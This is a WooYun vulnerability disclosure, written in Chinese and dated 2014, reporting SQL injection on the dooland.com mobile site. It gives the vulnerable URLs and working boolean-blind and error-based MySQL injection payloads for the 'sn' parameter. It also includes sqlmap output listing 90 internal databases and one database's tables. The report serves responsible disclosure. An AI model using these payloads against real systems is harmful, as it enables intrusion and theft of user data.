wybug_title: 读览天下SQL注入110W用户信息泄露
wybug_detail:
漏洞详情 披露状态：   									2014-02-24：	细节已通知厂商并且等待厂商处理中									2014-02-24：	厂商已经确认，细节仅向厂商公开									2014-03-06：	细节向核心白帽子及相关领域专家公开									2014-03-16：	细节向普通白帽子公开									2014-03-26：	细节向实习白帽子公开									2014-04-10：	细节向公众公开  简要描述： 读览天下SQL注入110W用户信息泄露 详细说明：  读览天下SQL注入110W用户信息告急，大量数据库，各种内部使用程序和系统数据库等。注入点发生在“激活VIP卡”处：
http://wap.dooland.com/index.php?verify=dGVzdGVyMTIzLTk2ZTc5MjE4OTY1ZWI3MmM5MmE1NDlkZDVhMzMwMTEy




-----------第二处SQL注射------------
http://wap.dooland.com/b.phphttp://wap.dooland.com/b.php?id=9112&verify=dGVzdGVyMTIzLTk2ZTc5MjE4OTY1ZWI3MmM5MmE1NDlkZDVhMzMwMTEy




   漏洞证明：  ---Place: POSTParameter: sn    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL    Payload: sn=-8632' OR (2972=2972)#&pw=123&submit=%E6%BF%80%E6%    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: sn=123' AND (SELECT 6677 FROM(SELECT COUNT(*),CONCAT(0x7174636471,(SELECT (CASE WHEN (6677=6677) THEN 1 ELSE 0 END)),0x716d6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'vaMu'='vaMu&pw=123&submit=%E6%BF%80%E6%B4%BB---[10:52:27] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.10back-end DBMS: MySQL 5.0[10:52:27] [INFO] fetching database names[10:52:27] [INFO] the SQL query used returns 90 entriesavailable databases [90]:[*] A_Bank[*] ads[*] adstat[*] adsystem[*] ahvnet[*] api_site_chinagames[*] api_site_tttz[*] asus[*] bbappnet[*] billwang[*] business[*] client[*] collector[*] common[*] cover[*] dayoo[*] dongyou[*] DoolandERP[*] doolandmanager[*] DownLoadInfoDB[*] dudubao[*] dudubao_bak[*] dudubao_book[*] dudubao_gztv[*] dudubao_hd[*] eben[*] expand[*] fhxxw[*] gdvnet[*] gdvnet2[*] gdwap[*] gxvnet[*] gzvnet[*] hzkzy[*] ifeng[*] information_schema[*] ipad_adsys[*] JIANBAO[*] jigou[*] jsvnet[*] jxvnet[*] kindle_caixin[*] kuanzon[*] lcbook[*] lephone[*] lib[*] mag_pub[*] magazine_upload[*] mysql[*] news[*] newspaper[*] OEM[*] opds_aldiko[*] paycenter[*] qinghua[*] qqcaibei[*] readstat[*] ReadStat[*] sctfds[*] scvnet[*] seo[*] shop_car[*] sina_book[*] sina_mag_cooperation[*] stat_dudubao[*] stat_gxvnet[*] stat_jxvnet[*] stat_paihang[*] suzhmobile[*] system_check[*] test[*] tob_client[*] ty189[*] ty189_mail[*] ty189_mail_hd[*] ty189_mail_new[*] ty189_mail_test[*] ucenter[*] unicom[*] union[*] vip_statistics[*] vnet139[*] wangyi163[*] wap[*] xjvnet[*] ynvnet[*] zazhishe[*] zhongshan[*] zhuanti[*] zjvnet看看数据库adsystem内容：Database: adsystem[17 tables]+-------------+| Client_ad   || Client_stat || config      || exe_stat    || keywords_ad || onsale      || page_ad     || xhad_ad     || xhad_admin  || xhad_biz    || xhad_config || xhad_day    || xhad_hour   || xhad_ip     || xhad_month  || xhad_type   || xhad_year   |+-------------+   修复方案：  过滤   版权声明：转载请注明来源 xfkxfk@乌云
